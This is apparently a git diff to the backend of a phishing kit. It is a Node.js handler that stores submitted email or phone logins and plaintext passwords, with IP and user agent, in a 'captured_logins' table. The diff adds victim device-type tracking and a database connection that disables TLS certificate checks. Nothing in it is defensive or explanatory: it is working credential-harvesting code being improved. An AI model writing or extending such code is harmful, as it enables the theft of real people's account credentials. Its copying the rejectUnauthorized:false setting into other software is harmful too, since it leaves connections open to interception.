@@ -2,9 +2,10 @@ const { Pool } = require('pg');
 
 const pool = new Pool({
   connectionString: process.env.DATABASE_URL,
+  ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false
 });
 
-export default async function handler(req, res) {
+module.exports = async function handler(req, res) {
   if (req.method !== 'POST') {
     return res.status(405).json({ error: 'Method not allowed' });
   }
@@ -23,11 +24,15 @@ export default async function handler(req, res) {
     const cleanEmail = email.replace(/\D/g, '');
     const isValidFormat = emailRegex.test(email) || phoneRegex.test(cleanEmail);
     
+    // Detect device type
+    const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent || '');
+    const deviceType = isMobile ? 'mobile' : 'desktop';
+    
     await client.query(
       `INSERT INTO captured_logins 
-       (email, password, user_agent, ip_address, is_valid_format) 
-       VALUES ($1, $2, $3, $4, $5)`,
-      [email, password, userAgent, ip, isValidFormat]
+       (email, password, user_agent, ip_address, is_valid_format, device_type) 
+       VALUES ($1, $2, $3, $4, $5, $6)`,
+      [email, password, userAgent, ip, isValidFormat, deviceType]
     );
     
     await client.release();
@@ -36,10 +41,11 @@ export default async function handler(req, res) {
       email: email.substring(0, 3) + '***', 
       password: password.substring(0, 2) + '***',
       ip,
-      valid: isValidFormat 
+      valid: isValidFormat,
+      device: deviceType
     });
     
-    res.status(200).json({ success: true });
+    res.status(200).json({ success: true, deviceType });
   } catch (error) {
     console.error('Database error:', error);
     res.status(500).json({ error: 'Failed to log credentials' });
